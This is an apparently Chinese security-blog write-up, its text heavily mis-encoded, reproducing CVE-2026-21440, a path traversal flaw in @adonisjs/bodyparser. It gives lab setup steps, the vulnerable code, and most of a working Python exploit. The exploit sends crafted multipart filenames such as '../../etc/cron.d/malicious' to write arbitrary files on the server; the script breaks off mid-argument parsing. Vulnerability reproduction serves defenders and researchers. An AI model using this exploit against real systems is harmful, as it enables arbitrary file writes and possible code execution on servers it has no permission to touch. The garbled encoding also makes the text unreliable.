#  å¤ç°ï¼ˆCVE-2026-21440ï¼‰@adonisjs/bodyparserè·¯å¾„éå†æ¼æ´åˆ©ç”¨  
æ˜Ÿå¤œAIå®‰å…¨
                    æ˜Ÿå¤œAIå®‰å…¨  æ˜Ÿå¤œAIå®‰å…¨   2026-01-25 10:36  
  
ğŸ“Œå„ä½å¯ä»¥å°†å…¬ä¼—å·è®¾ä¸ºæ˜Ÿæ ‡â­  
  
ğŸ“Œè¿™æ ·å°±ä¸ä¼šé”™è¿‡æ¯æœŸçš„æ¨èå†…å®¹å•¦~  
  
ğŸ“Œè¿™å¯¹æˆ‘çœŸçš„å¾ˆé‡è¦ï¼  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/SffY5ZO3R2lAVT6CicZmYO3GGZre7KEwxiaouHrUbg3rQ0UUVhEI7eDxct12pq4ITqI98fcU1rsJXlHib3VF1n4ew/640?wx_fmt=png&from=appmsg "image")  
  
ğŸ“Œ1. æœ¬å¹³å°åˆ†äº«çš„å®‰å…¨çŸ¥è¯†å’Œå·¥å…·ä¿¡æ¯æºäºå…¬å¼€èµ„æ–™åŠä¸“ä¸šäº¤æµï¼Œä»…ä¾›ä¸ªäººå­¦ä¹ æå‡å®‰å…¨æ„è¯†ã€äº†è§£é˜²æŠ¤æ‰‹æ®µï¼Œç¦æ­¢ç”¨äºä»»ä½•è¿æ³•æ´»åŠ¨ï¼Œå¦åˆ™ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…æ³•å¾‹åæœã€‚  
  
ğŸ“Œ2. æ‰€åˆ†äº«å†…å®¹åŠå·¥å…·è™½å…·æ™®éæ€§ï¼Œä½†å› åœºæ™¯ã€ç‰ˆæœ¬ã€ç³»ç»Ÿç­‰å› ç´ ï¼Œæ— æ³•ä¿è¯å®Œå…¨é€‚ç”¨ï¼Œä½¿ç”¨è€…è¦è‡ªè¡Œæ‰¿æ‹…çŸ¥è¯†è¿ç”¨ä¸å½“ã€å·¥å…·ä½¿ç”¨æ•…éšœå¸¦æ¥çš„æŸå¤±ã€‚  
  
ğŸ“Œ3. ä½¿ç”¨è€…åœ¨å­¦ä¹ æ“ä½œè¿‡ç¨‹ä¸­åŠ¡å¿…éµå®ˆæ³•è§„é“å¾·ï¼Œé¢å¯¹æœ‰é£é™©ç¯èŠ‚éœ€è°¨æ…é¢„ä¼°åæœã€åšå¥½é˜²æŠ¤ï¼Œè‹¥æœªè°¨æ…æ“ä½œå¼•å‘ä¿¡æ¯æ³„éœ²ã€è®¾å¤‡æŸåç­‰ä¸è‰¯åæœï¼Œè´£ä»»è‡ªè´Ÿã€‚  
## ä¸€ã€æ¼æ´è¯¦æƒ…  
  
@adonisjs/bodyparser  
Â åŒ…å†…å­˜åœ¨ä¸€ä¸ªä¸¥é‡çš„è·¯å¾„éå†æ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…èƒ½å¤Ÿå°†ä»»æ„æ–‡ä»¶å†™å…¥åˆ°é¢„æœŸçš„ä¸Šä¼ ç›®å½•ä¹‹å¤–ã€‚  
  
å½“è°ƒç”¨Â multipartfile.move()  
Â å‡½æ•°æ—¶ï¼Œè‹¥æœªæ˜¾å¼æä¾›ç»è¿‡å‡€åŒ–çš„æ–‡ä»¶åï¼Œè§£æå™¨å°†é»˜è®¤é‡‡ç”¨å®¢æˆ·ç«¯æä¾›çš„æ–‡ä»¶åï¼Œå¹¶ä¸”æœªå¯¹å…¶è¿›è¡Œé€‚å½“çš„å‡€åŒ–å¤„ç†ã€‚  
  
ç”±äºåº•å±‚å®ç°ä½¿ç”¨äº†Â path.join()  
ï¼Œä¸”Â options.overwrite  
Â çš„é»˜è®¤å€¼ä¸ºÂ true  
ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªåŒ…å«ç›®å½•éå†åºåˆ—ï¼ˆä¾‹å¦‚Â ../../etc/cron.d/malicious  
ï¼‰çš„æ¶æ„æ–‡ä»¶åï¼Œä»è€Œå°†æ–‡ä»¶å†™å…¥æ–‡ä»¶ç³»ç»Ÿçš„ä»»æ„ä½ç½®ï¼Œè¿™å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚  
## äºŒã€å—å½±å“ç‰ˆæœ¬  
<table><thead><tr><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">åŒ…</span></section></th><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">å—å½±å“ç‰ˆæœ¬</span></section></th><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">å·²ä¿®å¤ç‰ˆæœ¬</span></section></th></tr></thead><tbody><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">@adonisjs/bodyparser</span></section></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">â‰¤ 10.1.1</span></section></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">10.1.2</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">@adonisjs/bodyparser</span></section></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">11.0.0-next.1 è‡³ 11.0.0-next.5</span></section></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">11.0.0-next.6</span></section></td></tr></tbody></table>## ä¸‰ã€æ¼æ´å¤ç°æ­¥éª¤  
  
æ­¤å¤„ä½¿ç”¨ cve-2026-21440-writeup-poc ä¸­çš„ Vulnerable-App ç¯å¢ƒè¿›è¡Œæ¼æ´å¤ç°æµ‹è¯•ï¼Œå¤ç°ç³»ç»Ÿä¸º Ubuntuã€‚é¡¹ç›®é“¾æ¥åœ°å€ï¼šhttps://github.com/k0nnect/cve-2026-21440-writeup-poc.git[1]  
### 1. ä¸‹è½½é¡¹ç›®  
  
é€šè¿‡ git clone æˆ–ç›´æ¥ä¸‹è½½ï¼Œå°† cve-2026-21440-writeup-poc é¡¹ç›®ä¿å­˜è‡³ Ubuntu çš„æœ¬åœ°ç›®å½•ï¼Œæ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0ZzVqR8PkzpSpbIaPuiaTNyLe9iar5QwacKZrkI24icGRLCtCm3Ixf3jaw/640?wx_fmt=png&from=appmsg "")  
### 2. åˆ‡æ¢ç›®å½•  
  
åœ¨ç»ˆç«¯ä¸­ï¼Œåˆ‡æ¢åˆ° cve-2026-21440-writeup-poc é¡¹ç›®çš„å­ç›®å½• Vulnerable-App ä¸­ï¼Œæ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0WEJKbldzqRNG5ArSpicc2dfEBhqWbRFH2S98IMpuE8icGf3bhCzyVCXg/640?wx_fmt=png&from=appmsg "")  
### 3. å®‰è£…ä¾èµ–  
  
è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰è£… Vulnerable-App æ¼æ´ç¯å¢ƒæ‰€éœ€çš„ä¾èµ–ï¼Œæ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚  
- sudo npm install  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b08EEDp6ugdZB97KFkgiauiax0CaqLD7lxtuJRCahJvmAJjPDGrFEtpFpQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0uOib8iaAicrCaax7JSG3uByagXfVVLOJa0NqWhHrDH9yibiawPIx5qibsuEA/640?wx_fmt=png&from=appmsg "")  
### 4. å¤åˆ¶é…ç½®æ–‡ä»¶  
  
è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¤åˆ¶ Vulnerable-App æ¼æ´ç¯å¢ƒçš„é…ç½®æ–‡ä»¶ï¼Œæ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚  
- cp env.example .env  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b04b0ULQcOYLWK3UcIuAx8qgFliaE338yJ48ibaqGicyatlqEQoqCXNOPDA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0OgUtWibzVDOkaW4W9ibJOGqRz47kplgoabxvdo59YQUOT69rr5oDWY8g/640?wx_fmt=png&from=appmsg "")  
### 5. å¯åŠ¨ç¯å¢ƒ  
  
è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¯åŠ¨ Vulnerable-App æ¼æ´å¼€å‘ç¯å¢ƒï¼Œæ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚  
- sudo npm run dev  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0YRwwbBU97ybiaVZF8jpTj8qcscxCEmss6sBxacSZ9naBUEu0LWrx3iaA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b04b1SF8vWiaGfIYEt5ANHZ5akicugRnCsGHr7jtoZGJdQpgJkArpv80UA/640?wx_fmt=png&from=appmsg "")  
  
æœåŠ¡å™¨å°†åœ¨ http://localhost:3333[2]  
Â å¯åŠ¨ã€‚  
### 6. åˆ‡æ¢è‡³æ”»å‡»è„šæœ¬ç›®å½•  
  
æ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯ï¼Œåˆ‡æ¢åˆ° cve-2026-21440-writeup-poc ä¸­çš„ Exploit-PoC ç›®å½•ï¼Œæ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0xH7VcrvicyJibibFyfnKAibdhEuUUfibJEq172cLEDiaeaN6eR8Yy845ibrfQ/640?wx_fmt=png&from=appmsg "")  
### 7. å®‰è£… Python æ¨¡å—  
  
è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰è£… exploit.py è„šæœ¬æ‰€éœ€çš„ Python æ¨¡å—ï¼Œæ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚  
- pip install -r requirements.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0Z1ibxOe9E61D3ickWmevTwamwHbUNlQ4zBswLTOPhNM4IGwicbYricZBaQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0GFAha10BeEoaqNNs3H3VKQoBV8y8fbtWBHibuw9euUZ12LtXwo5gtMw/640?wx_fmt=png&from=appmsg "")  
### 8. æ‰§è¡Œæ¼æ´åˆ©ç”¨  
  
è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæ‰§è¡Œ exploit.py ç¨‹åºæ¥æµ‹è¯• CVE-2026-21440 æ¼æ´ï¼Œå°è¯•åœ¨æœåŠ¡å™¨æŒ‡å®šç›®å½•å†™å…¥ pwned.txt æ–‡ä»¶ï¼Œæ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚  
- python3 exploit.py --url http://localhost:3333/upload --path "../../tmp/pwned.txt" --content "vulnerability exists!"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0lAGUO1M3y5wMtBQCqYmmUW4fmMe1HiagicFgG6M1l5I2MwejYcBt9d8Q/640?wx_fmt=png&from=appmsg "")  
  
ä»¥ä¸‹æ˜¯ Vulnerable-App æœåŠ¡ç«¯è¾“å‡ºçš„æ—¥å¿—ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0pUqpoQXVviacNz8J53osl9PG894mrYJrvrib5S75OFOrsntZcbXxUBkg/640?wx_fmt=png&from=appmsg "")  
## 9. æ£€æŸ¥æŒ‡å®šç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨ pwned.txt æ–‡ä»¶ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸï¼Œå¦‚ä¸‹æ‰€ç¤º  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b09nD9Dp1xiagHNVQvvDTrkOaibVXxvlnVGeZN1I1FwXGjqUtlMZcTibbyA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE209uzic92FXsGnOaZC1hYA7b0FibsOJzBona0yia5zu3TVqctRlB48TSejuAnVibQrnsyHCYlP9Pmia3b2A/640?wx_fmt=png&from=appmsg "")  
## å››ã€æ¼æ´ä»£ç ä¸æ¼æ´åˆ©ç”¨åˆ†æ  
## æ¼æ´ä»£ç åˆ†æ  
```
// @adonisjs/bodyparser ä¸­çš„æ¼æ´ä»£ç è·¯å¾„asyncÂ move(location: string, options?: { name?: string; overwrite?: boolean }):Â Promise<void> {Â Â constÂ fileName = options?.nameÂ ||Â this.clientNameÂ Â // â† ä½¿ç”¨äº†æœªå‡€åŒ–çš„å®¢æˆ·ç«¯è¾“å…¥Â Â constÂ filePath = path.join(location, fileName) Â  Â Â // â† path.join å…è®¸è·¯å¾„éå†Â Â // ...Â Â awaitÂ fs.move(this.tmpPath, filePath, {Â overwrite: options?.overwriteÂ ??Â trueÂ })}
```  
```
// âŒ å­˜åœ¨æ¼æ´ - ä½¿ç”¨äº†å®¢æˆ·ç«¯æä¾›çš„æ–‡ä»¶åpublicÂ asyncÂ upload({ request, response }: HttpContext) {Â Â constÂ file = request.file('upload')Â Â ifÂ (file) {Â  Â Â awaitÂ file.move(app.tmpPath()) Â // ä½¿ç”¨ clientName ä½œä¸ºæ–‡ä»¶åÂ  }Â Â returnÂ response.ok({Â message:Â 'uploaded'Â })}
```  
## æ¼æ´åˆ©ç”¨åˆ†æ  
```
#!/usr/bin/env python3"""CVE-2026-21440 - Path Traversal Exploit for @adonisjs/bodyparserè¿™ä¸ªè„šæœ¬åˆ©ç”¨ @adonisjs/bodyparser åŒ…ä¸­çš„è·¯å¾„éå†æ¼æ´ï¼ˆå½±å“ç‰ˆæœ¬ï¼šâ‰¤10.1.1 å’Œ 11.0.0-next.1 åˆ° 11.0.0-next.5ï¼‰è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ åŒ…å«ç›®å½•éå†åºåˆ—çš„æ¶æ„æ–‡ä»¶åï¼Œåœ¨é¢„æœŸä¸Šä¼ ç›®å½•ä¹‹å¤–å†™å…¥ä»»æ„æ–‡ä»¶ã€‚ä½œè€…ï¼šk0nnectæ—¥æœŸï¼š2026-01-07âš ï¸ Â å…è´£å£°æ˜ï¼šæ­¤å·¥å…·ä»…ç”¨äºæˆæƒå®‰å…¨æµ‹è¯•ã€‚Â  Â  æœªç»æˆæƒè®¿é—®è®¡ç®—æœºç³»ç»Ÿæ˜¯éæ³•çš„ã€‚"""importÂ argparseimportÂ sysimportÂ osimportÂ socketfromÂ urllib.parseÂ importÂ urlparse, urljointry:Â  Â Â importÂ requestsexceptÂ ImportError:Â  Â Â print("[!] Error: 'requests' library not found.")Â  Â Â print(" Â  Â Install with: pip install requests")Â  Â  sys.exit(1)BANNER =Â """â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—â•‘ Â  Â  Â  Â  Â  CVE-2026-21440 Path Traversal Exploit Â  Â  Â  Â  Â  Â  Â  â•‘â•‘ Â  Â  Â  Â  Â  Â  Â  Â  Â @adonisjs/bodyparser Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â•‘â•‘ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â•‘â•‘ Â  Â  Â  Â  Â github.com/k0nnect/cve-2026-21440-writeup Â  Â  Â  Â  Â  Â â•‘â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"""classPathTraversalExploit:Â  Â Â """Â  Â  CVE-2026-21440 è·¯å¾„éå†æ¼æ´çš„åˆ©ç”¨ç±»ã€‚Â  Â  """Â  Â Â def__init__(self, target_url:Â str, timeout:Â intÂ =Â 10, verify_ssl:Â boolÂ =Â True):Â  Â  Â  Â Â """Â  Â  Â  Â  åˆå§‹åŒ–æ¼æ´åˆ©ç”¨å¯¹è±¡ã€‚Â  Â  Â  Â  """Â  Â  Â  Â Â self.target_url = target_url.rstrip('/') Â # ç›®æ ‡URLï¼Œç§»é™¤æœ«å°¾æ–œæ Â  Â  Â  Â Â self.timeout = timeout Â # è¯·æ±‚è¶…æ—¶æ—¶é—´Â  Â  Â  Â Â self.verify_ssl = verify_ssl Â # SSLéªŒè¯å¼€å…³Â  Â  Â  Â Â self.session = requests.Session() Â # åˆ›å»ºä¼šè¯å¯¹è±¡Â  Â  Â  Â Â # è§£æURLÂ  Â  Â  Â  parsed = urlparse(self.target_url)Â  Â  Â  Â Â self.host = parsed.hostname Â # ç›®æ ‡ä¸»æœºåÂ  Â  Â  Â Â self.port = parsed.portÂ orÂ (443ifÂ parsed.scheme ==Â 'https'else80) Â # ç«¯å£Â  Â  Â  Â Â self.path = parsed.pathÂ or'/'# è·¯å¾„Â  Â  Â  Â Â self.is_https = parsed.scheme ==Â 'https'# æ˜¯å¦ä¸ºHTTPSÂ  Â Â defcheck_target(self) ->Â bool:Â  Â  Â  Â Â """æ£€æŸ¥ç›®æ ‡æ˜¯å¦å¯è¾¾ä¸”å¥åº·ã€‚"""Â  Â  Â  Â Â try:Â  Â  Â  Â  Â  Â  base_url =Â '/'.join(self.target_url.split('/')[:-1])Â  Â  Â  Â  Â  Â  health_url = urljoin(base_url +Â '/',Â 'health') Â # æ„é€ å¥åº·æ£€æŸ¥URLÂ  Â  Â  Â  Â  Â  response =Â self.session.get(health_url, timeout=self.timeout, verify=self.verify_ssl)Â  Â  Â  Â  Â  Â Â ifÂ response.status_code ==Â 200:Â  Â  Â  Â  Â  Â  Â  Â Â print("[+] Target is reachable and healthy")Â  Â  Â  Â  Â  Â  Â  Â Â returnTrueÂ  Â  Â  Â  Â  Â Â else:Â  Â  Â  Â  Â  Â  Â  Â Â print(f"[-] Target returned statusÂ {response.status_code}")Â  Â  Â  Â  Â  Â  Â  Â Â returnFalseÂ  Â  Â  Â Â exceptÂ ExceptionÂ asÂ e:Â  Â  Â  Â  Â  Â Â print(f"[!] Cannot connect to target:Â {e}")Â  Â  Â  Â  Â  Â Â returnFalse``````pythondefexploit(self, traversal_path:Â str, content:Â str, verbose:Â boolÂ =Â False) ->Â bool:Â  Â Â """Â  Â  é€šè¿‡åŸå§‹socketæ‰§è¡Œè·¯å¾„éå†æ¼æ´åˆ©ç”¨ã€‚Â  Â  æ­¤æ–¹æ³•èƒ½å¤Ÿè§„é¿æ‰€æœ‰åº“çº§åˆ«çš„æ–‡ä»¶åæ¸…ç†æœºåˆ¶ã€‚Â  Â  """Â  Â Â print(f"\n[*] ç›®æ ‡URL:Â {self.target_url}")Â  Â Â print(f"[*] éå†è·¯å¾„:Â {traversal_path}") Â # ä¾‹å¦‚ï¼š../../etc/passwdÂ  Â Â print(f"[*] è½½è·å¤§å°:Â {len(content)}Â å­—èŠ‚") Â # è½½è·å¤§å°Â  Â Â # æ„å»ºåŒ…å«æœªæ¸…ç†æ–‡ä»¶åçš„å¤šéƒ¨åˆ†è¡¨å•æ•°æ®Â  Â  boundary =Â "----CVE2026214440Boundary"# è¾¹ç•Œå­—ç¬¦ä¸²Â  Â Â # æ„å»ºmultipartè¡¨å•æ•°æ®ä½“Â  Â  body = (Â  Â  Â  Â Â f"--{boundary}\r\n"Â  Â  Â  Â Â f'Content-Disposition: form-data; name="file"; filename="{traversal_path}"\r\n'Â  Â  Â  Â Â f"Content-Type: application/octet-stream\r\n"Â  Â  Â  Â Â f"\r\n"Â  Â  Â  Â Â f"{content}\r\n"Â  Â  Â  Â Â f"--{boundary}--\r\n"Â  Â  ).encode('utf-8')Â  Â Â # æ„å»ºåŸå§‹HTTPè¯·æ±‚Â  Â  request = (Â  Â  Â  Â Â f"POSTÂ {self.path}Â HTTP/1.1\r\n"Â  Â  Â  Â Â f"Host:Â {self.host}:{self.port}\r\n"Â  Â  Â  Â Â f"Content-Type: multipart/form-data; boundary={boundary}\r\n"Â  Â  Â  Â Â f"Content-Length:Â {len(body)}\r\n"# å†…å®¹é•¿åº¦Â  Â  Â  Â Â f"Connection: close\r\n"# å…³é—­è¿æ¥Â  Â  Â  Â Â f"\r\n"# ç©ºè¡Œåˆ†éš”å¤´éƒ¨å’Œä½“éƒ¨Â  Â  ).encode('utf-8') + body Â # åŠ ä¸Šä½“éƒ¨Â  Â Â ifÂ verbose:Â  Â  Â  Â Â print(f"[*] è¯·æ±‚ä¸­æ„é€ çš„æ–‡ä»¶å:Â {traversal_path}")Â  Â  Â  Â Â print(f"[*] åŸå§‹è¯·æ±‚å¤§å°:Â {len(request)}Â å­—èŠ‚")Â  Â Â try:Â  Â  Â  Â Â print("\n[*] æ­£åœ¨é€šè¿‡åŸå§‹socketå‘é€æ”»å‡»è½½è·...")Â  Â  Â  Â Â # åˆ›å»ºsocketå¹¶è¿æ¥Â  Â  Â  Â  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)Â  Â  Â  Â  sock.settimeout(self.timeout)Â  Â  Â  Â Â ifself.is_https: Â # å¦‚æœæ˜¯HTTPSï¼ŒåŒ…è£…socketÂ  Â  Â  Â  Â  Â Â importÂ sslÂ  Â  Â  Â  Â  Â  context = ssl.create_default_context()Â  Â  Â  Â  Â  Â Â ifnotself.verify_ssl: Â # å¦‚æœç¦ç”¨SSLéªŒè¯Â  Â  Â  Â  Â  Â  Â  Â  context.check_hostname =Â FalseÂ  Â  Â  Â  Â  Â  Â  Â  context.verify_mode = ssl.CERT_NONEÂ  Â  Â  Â  Â  Â  sock = context.wrap_socket(sock, server_hostname=self.host)Â  Â  Â  Â  sock.connect((self.host,Â self.port))Â  Â  Â  Â  sock.sendall(request) Â # å‘é€æ•´ä¸ªè¯·æ±‚Â  Â  Â  Â Â # æ¥æ”¶å“åº”Â  Â  Â  Â  response =Â b""Â  Â  Â  Â Â whileTrue:Â  Â  Â  Â  Â  Â  chunk = sock.recv(4096) Â # æ¯æ¬¡æ¥æ”¶4096å­—èŠ‚Â  Â  Â  Â  Â  Â Â ifnotÂ chunk:Â  Â  Â  Â  Â  Â  Â  Â Â breakÂ  Â  Â  Â  Â  Â  response += chunkÂ  Â  Â  Â  sock.close()Â  Â  Â  Â Â # è§£æå“åº”Â  Â  Â  Â  response_str = response.decode('utf-8', errors='ignore')Â  Â  Â  Â Â ifÂ verbose:Â  Â  Â  Â  Â  Â Â print(f"[*] åŸå§‹å“åº”:\n{response_str[:1000]}")Â  Â  Â  Â Â # æå–çŠ¶æ€ç Â  Â  Â  Â  first_line = response_str.split('\r\n')[0]Â  Â  Â  Â  status_code =Â int(first_line.split()[1])Â iflen(first_line.split()) >Â 1else0Â  Â  Â  Â Â # æå–å“åº”ä½“ï¼ˆåœ¨åŒCRLFä¹‹åï¼‰Â  Â  Â  Â  body_start = response_str.find('\r\n\r\n')Â  Â  Â  Â  response_body = response_str[body_start +Â 4:]Â ifÂ body_start != -1else""Â  Â  Â  Â Â ifÂ verbose:Â  Â  Â  Â  Â  Â Â print(f"[*] å“åº”çŠ¶æ€:Â {status_code}")Â  Â  Â  Â  Â  Â Â print(f"[*] å“åº”ä½“:Â {response_body[:500]}")Â  Â  Â  Â Â ifÂ status_code ==Â 200:Â  Â  Â  Â  Â  Â Â print("\n[+] âœ“ æ¼æ´åˆ©ç”¨æˆåŠŸï¼")Â  Â  Â  Â  Â  Â Â # å°è¯•è§£æJSONå“åº”Â  Â  Â  Â  Â  Â Â try:Â  Â  Â  Â  Â  Â  Â  Â Â importÂ jsonÂ  Â  Â  Â  Â  Â  Â  Â Â # å¤„ç†åˆ†å—ä¼ è¾“ç¼–ç Â  Â  Â  Â  Â  Â  Â  Â Â if'Transfer-Encoding: chunked'inÂ response_str:Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â # ç®€å•çš„åˆ†å—è§£ç  - åœ¨å“åº”ä½“ä¸­æŸ¥æ‰¾JSONÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  json_start = response_body.find('{')Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  json_end = response_body.rfind('}') +Â 1Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ json_start != -1andÂ json_end > json_start:Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  response_body = response_body[json_start:json_end]Â  Â  Â  Â  Â  Â  Â  Â  data = json.loads(response_body)Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ data.get('success')Â and'data'inÂ data:Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  info = data['data']Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â print(f"[+] åŸå§‹æ–‡ä»¶å:Â {info.get('originalName',Â 'N/A')}")Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â print(f"[+] è§£æè·¯å¾„:Â {info.get('resolvedPath',Â 'N/A')}")Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ info.get('escapedUploadsDir'):Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â print(f"[+] âš ï¸ Â è·¯å¾„éå†å·²ç¡®è®¤ - å·²é€ƒé€¸ä¸Šä¼ ç›®å½•ï¼")Â  Â  Â  Â  Â  Â Â except:Â  Â  Â  Â  Â  Â  Â  Â Â pass# JSONè§£æå¤±è´¥æ—¶ä¸ä¸­æ–­Â  Â  Â  Â  Â  Â Â returnTrueÂ  Â  Â  Â Â elifÂ status_code ==Â 400:Â  Â  Â  Â  Â  Â Â print("\n[-] âœ— è¯·æ±‚é”™è¯¯ - æ–‡ä»¶å¯èƒ½å·²è¢«æ‹’ç»")Â  Â  Â  Â  Â  Â Â returnFalseÂ  Â  Â  Â Â else:Â  Â  Â  Â  Â  Â Â print(f"\n[-] æ„å¤–çŠ¶æ€ç :Â {status_code}")Â  Â  Â  Â  Â  Â Â returnFalseÂ  Â Â exceptÂ socket.timeout:Â  Â  Â  Â Â print("\n[!] è¯·æ±‚è¶…æ—¶")Â  Â  Â  Â Â returnFalseÂ  Â Â exceptÂ ConnectionRefusedError:Â  Â  Â  Â Â print("\n[!] è¿æ¥è¢«æ‹’ç»")Â  Â  Â  Â Â returnFalseÂ  Â Â exceptÂ ExceptionÂ asÂ e:Â  Â  Â  Â Â print(f"\n[!] æ¼æ´åˆ©ç”¨å¤±è´¥:Â {e}")Â  Â  Â  Â Â ifÂ verbose: Â # è¯¦ç»†æ¨¡å¼ä¸‹æ‰“å°å †æ ˆè·Ÿè¸ªÂ  Â  Â  Â  Â  Â Â importÂ tracebackÂ  Â  Â  Â  Â  Â  traceback.print_exc()Â  Â  Â  Â Â returnFalse``````pythondefmain():Â  Â Â """ç¨‹åºçš„ä¸»å…¥å£å‡½æ•°ã€‚"""Â  Â  parser = argparse.ArgumentParser(Â  Â  Â  Â  description='é’ˆå¯¹ CVE-2026-21440 è·¯å¾„éå†æ¼æ´çš„åˆ©ç”¨å·¥å…·',Â  Â  Â  Â  formatter_class=argparse.RawDescriptionHelpFormatter,Â  Â  Â  Â  epilog="""ä½¿ç”¨ç¤ºä¾‹ï¼šÂ  python exploit.py --url http://target:3333/upload --path "../test.txt"Â  python exploit.py --url http://target:3333/upload --path "../../tmp/pwned.txt" --content "pwned"Â  Â  Â  Â  """Â  Â  )Â  Â Â # è®¾ç½®å‘½ä»¤è¡Œå‚æ•°Â  Â  parser.add_argument('--url',Â '-u', required=True,Â help='ç›®æ ‡ä¸Šä¼ æ¥å£çš„URLåœ°å€')Â  Â  parser.add_argument('--path',Â '-p', 